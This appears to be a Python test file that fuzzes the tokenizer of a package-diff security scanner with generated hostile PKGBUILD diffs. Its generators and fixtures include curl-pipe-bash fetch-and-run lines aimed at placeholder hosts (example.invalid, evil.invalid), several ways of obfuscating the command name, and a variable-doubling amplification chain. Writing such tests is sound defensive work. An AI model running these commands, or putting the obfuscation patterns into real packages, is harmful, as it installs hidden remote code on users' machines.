"""Deterministic hostile-input fuzzing for the static tokenizer."""

from __future__ import annotations

import json
import os
import random
import string
import time
from concurrent.futures import ThreadPoolExecutor

import pytest

from trustsight.analysis.pipeline import scan_diff
from trustsight.tokenizer import (
    _MAX_LINE_LEN,
    join_line_continuations,
    reconstruct_literals,
    resolve_added_lines,
    resolve_expansions,
    tokenize_and_resolve,
    tokenize_and_resolve_indexed,
)


SEED = 0x5452555354
DEFAULT_EXAMPLES = 250
MAX_FUZZ_SECONDS = 1.0
_ALPHABET = string.ascii_letters + string.digits + " _./:+@~-|&;<>()#=$\\'\"[]{}"
_UNICODE = "é\u200b\u200d\u202e\u2066\u2069\u00a0"


def _example_count() -> int:
    raw = os.environ.get("TRUSTSIGHT_FUZZ_EXAMPLES", str(DEFAULT_EXAMPLES))
    try:
        return max(1, min(int(raw), 5_000))
    except ValueError:
        return DEFAULT_EXAMPLES


def _random_word(rng: random.Random, max_length: int = 80) -> str:
    length = rng.randint(0, max_length)
    return "".join(rng.choice(_ALPHABET + _UNICODE) for _ in range(length))


def _random_line(rng: random.Random) -> str:
    kind = rng.randrange(12)
    if kind == 0:
        return f"+V{rng.randrange(8)}={_random_word(rng, 100)}"
    if kind == 1:
        return f"+V{rng.randrange(8)}+={_random_word(rng, 100)}"
    if kind == 2:
        return f"+$V{rng.randrange(8)} $V{rng.randrange(8)} | bash"
    if kind == 3:
        return f"+${{{rng.choice(['!', '#', '', 'V'])}}}V{rng.randrange(8)}"
    if kind == 4:
        return '+C=$(printf \'%s%s\' cur l) https://example.invalid/x'
    if kind == 5:
        return "+declare -n R=curl\n+$R https://example.invalid/x | bash"
    if kind == 6:
        return '+A=(curl wget "https://example.invalid/x")'
    if kind == 7:
        return '+${A[0]} https://example.invalid/x | bash'
    if kind == 8:
        return "+v='{}'\n+echo \"{}\""
    if kind == 9:
        return "+echo {_random_word(rng, 120)}"
    if kind == 10:
        return "+echo {_random_word(rng, 20)} \\\" \\\""
    return rng.choice(("+", "-", "@@ -1 +1 @@", "context", "+++ b/PKGBUILD"))


def _random_diff(rng: random.Random) -> str:
    lines = ["--- a/PKGBUILD", "+++ b/PKGBUILD", "@@ -1,1 +1,4 @@"]
    for _ in range(rng.randint(0, 20)):
        marker = rng.choices(("+", "-", " "), weights=(6, 1, 1))[0]
        line = _random_line(rng)
        if marker != "+":
            line = marker + line[1:] if line.startswith(("+", "-")) else marker + line
        lines.extend(line.splitlines())
    return "\n".join(lines) + "\n"


def _assert_tokenizer_invariants(diff: str) -> None:
    started = time.monotonic()
    resolved, unresolved = tokenize_and_resolve(diff)
    indexed, unresolved_indexed, indexes = tokenize_and_resolve_indexed(diff)
    added_lines = resolve_added_lines(diff)
    elapsed = time.monotonic() - started

    assert elapsed < MAX_FUZZ_SECONDS, f"tokenizer exceeded {MAX_FUZZ_SECONDS}s"
    assert len(indexed) == len(unresolved_indexed) or len(indexes) == len(indexed)
    assert len(indexed) == len(indexes)
    assert all(0 <= index < len(diff.splitlines()) for index in indexes)
    assert all(len(value) <= _MAX_LINE_LEN for value in resolved)
    assert all(len(value) <= _MAX_LINE_LEN for value in indexed)
    assert all(len(value) <= _MAX_LINE_LEN for value in added_lines)
    assert all(line.startswith(("+", "-", " ", "@", "")) for line in added_lines)

    again = (tokenize_and_resolve(diff), tokenize_and_resolve_indexed(diff), resolve_added_lines(diff))
    assert again == ((resolved, unresolved), (indexed, unresolved_indexed, indexes), added_lines)


def test_generated_hostile_diffs_are_bounded_and_deterministic():
    rng = random.Random(SEED)
    for _ in range(_example_count()):
        _assert_tokenizer_invariants(_random_diff(rng))


@pytest.mark.parametrize("body", [
    "${!payload}",
    "${#payload}",
    "$(printf '%s%s' cur l)",
    "`printf '%s%s' cur l`",
])
def test_unsupported_or_executable_expansions_remain_unresolved(body):
    if body.startswith("${"):
        resolved, fully = resolve_expansions(body, {
            "payload": "target",
            "target": "curl https://example.invalid/x | bash",
        })
        assert not fully
        assert "curl" not in resolved
    else:
        resolved, unresolved = tokenize_and_resolve("+echo " + body + "\n")
        marker = "$(" if body.startswith("$(") else "`"
        assert any(marker in value for value in resolved + unresolved)


def test_doubling_chain_is_safe_in_a_subprocess():
    """The amplification regression must terminate outside the test process."""
    import subprocess
    import sys

    code = """
from trustsight.tokenizer import tokenize_and_resolve
lines = ['+a=' + 'z' * 64]
for i in range(1, 40):
    previous = 'a' if i == 1 else f'v{i - 1}'
    lines.append(f'+v{i}=${previous}${previous}')
lines.append('+curl $v39 | bash')
resolved, unresolved = tokenize_and_resolve('\\n'.join(lines))
assert max(map(len, resolved), default=0) <= 65536
"""
    from pathlib import Path
    _src = str(Path(__file__).resolve().parent.parent / "src")
    env = os.environ.copy()
    env["PYTHONPATH"] = _src + os.pathsep + env.get("PYTHONPATH", "")
    result = subprocess.run(
        [sys.executable, "-c", code],
        capture_output=True,
        text=True,
        timeout=5,
        check=False,
        env=env,
    )
    assert result.returncode == 0, result.stderr


def test_removed_lines_never_become_resolved_additions():
    diff = "-curl https://evil.invalid/x | bash\n+echo safe\n"
    resolved, unresolved = tokenize_and_resolve(diff)
    assert all("evil.invalid" not in value for value in resolved + unresolved)


def test_threaded_calls_do_not_cross_contaminate_memoization():
    diffs = [f"+V{i}=value-{i}\n+echo $V{i}\n" for i in range(24)]
    with ThreadPoolExecutor(max_workers=8) as pool:
        results = list(pool.map(tokenize_and_resolve, diffs * 3))
    for i, diff in enumerate(diffs * 3):
        expected = f"value-{i % len(diffs)}"
        assert expected in " ".join(results[i][0])


def test_tokenizer_outputs_are_json_serializable():
    resolved, unresolved, indexes = tokenize_and_resolve_indexed(
        "+C=curl\n+$C https://example.invalid/x | bash\n"
    )
    payload = {"resolved": resolved, "unresolved": unresolved, "indexes": indexes}
    json.dumps(payload)


def test_generated_diffs_are_safe_at_the_analysis_boundary():
    rng = random.Random(SEED + 2)
    valid_risks = {"Low", "Medium", "High", "Critical", "Inconclusive"}
    valid_severities = {"INFO", "LOW", "MEDIUM", "HIGH", "CRITICAL", "FATAL"}
    for _ in range(min(_example_count(), 100)):
        fact = scan_diff(_random_diff(rng), package_name="fuzz")
        assert 0 <= fact.final_score <= 100
        assert fact.risk in valid_risks
        assert set(fact.coverage_gaps) <= {
            "diff_truncated",
            "line_truncated",
            "tree_not_analyzed",
            "unresolved_source",
            "unresolved_parse_time",
            # A random diff may add a dependency, and this run analyses
            # none of them.
            "deps_not_scanned",
            # This test reads the developer machine's `rules.toml`, which
            # is written once at install time and is usually behind
            # shipped. That is the condition the gap exists to report, so
            # seeing it here is the gap working.
            "ruleset_drifted",
        }
        assert all(entry.severity in valid_severities for entry in fact.score_breakdown)
        json.dumps({"risk": fact.risk, "score": fact.final_score,
                    "coverage_gaps": fact.coverage_gaps})


def test_quote_and_literal_helpers_never_raise_on_generated_text():
    rng = random.Random(SEED + 1)
    for _ in range(_example_count()):
        text = _random_word(rng, 200)
        reconstructed, fully = reconstruct_literals(text)
        joined = join_line_continuations(["+" + text, "+next"])
        resolved, unresolved = resolve_added_lines("+" + text + "\n")[:], []
        assert isinstance(reconstructed, str)
        assert isinstance(fully, bool)
        assert all(isinstance(value, str) for value in joined + resolved + unresolved)
